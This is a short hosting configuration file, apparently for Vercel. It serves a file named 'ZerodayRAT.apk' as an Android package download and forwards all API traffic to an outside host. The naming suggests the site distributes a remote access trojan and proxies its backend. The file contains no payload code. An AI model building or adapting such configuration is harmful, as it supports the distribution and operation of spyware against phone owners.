{
  "headers": [
    {
      "source": "/download/ZerodayRAT.apk",
      "headers": [
        { "key": "Content-Disposition", "value": "attachment; filename=\"ZerodayRAT.apk\"" },
        { "key": "Content-Type", "value": "application/vnd.android.package-archive" }
      ]
    }
  ],
  "rewrites": [
    { "source": "/api/:path*", "destination": "https://api2.nikaipro.com/api/:path*" },
    { "source": "/(.*)", "destination": "/index.html" }
  ]
}
